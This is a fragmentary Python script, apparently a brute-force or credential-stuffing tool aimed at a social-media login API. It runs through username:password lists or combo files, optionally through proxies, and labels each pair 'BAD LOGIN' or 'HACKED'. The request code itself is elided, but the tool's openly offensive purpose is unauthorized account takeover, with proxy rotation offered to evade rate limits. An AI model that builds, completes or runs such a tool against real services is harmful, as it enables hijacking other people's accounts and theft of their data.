...
class FX_PY():
  def test_list(self,username,password):
        ...
        if Req == '{"user":true,"authenticated":false,"status":"ok"}' :
            print('=============================')
            print(f'{Red} BAD LOGIN >> {White}{username} : {password}')
            print('=============================')
            print('\n')
            ...
            print('\n\n')
            print('=============================');print('=============================')
            print(f'{Green} HACKED >> {White} {username} : {password}')
            print('=============================');print('=============================')
            print('\n\n')
            exit()
...
{Yellow}[{White}1{Yellow}] - user & pass file
{Yellow}[{White}2{Yellow}] - pass & user's file
{Yellow}[{White}3{Yellow}] - combo file 

{Yellow}[{White}4{Yellow}] - user & pass file >>> proxy
{Yellow}[{White}5{Yellow}] - pass & user's file >>> proxy
{Yellow}[{White}6{Yellow}] - combo file  >>> proxy {White}
==================================
